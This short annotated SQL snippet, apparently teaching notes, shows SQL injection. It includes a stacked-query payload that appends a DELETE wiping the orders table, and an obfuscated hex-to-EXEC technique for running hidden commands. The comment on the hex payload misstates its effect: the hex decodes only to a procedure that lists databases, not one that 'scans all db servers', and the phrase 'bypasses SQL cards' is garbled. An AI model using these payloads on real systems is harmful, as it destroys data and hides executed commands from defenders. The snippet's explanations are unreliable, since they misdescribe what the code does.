--  Dynamic SQL statement from front end
SELECT * FROM  Orders WHERE OrderId=25

-- SQL Injection to delete order
SELECT * FROM Orders WHERE OrderId=25 ; DELETE FROM orders;

-- Advanced Hexadecimal injection
DECLARE @v VARCHAR(255) --storage container inside SQL memory
SELECT @v = cast(0x73705F68656C706462 AS VARCHAR(255)) --hexadecimal command to scan all db servers , this bypasses SQL cards and store the command in a variable @v"
EXEC (@v) -- execution to pass hidden commands 

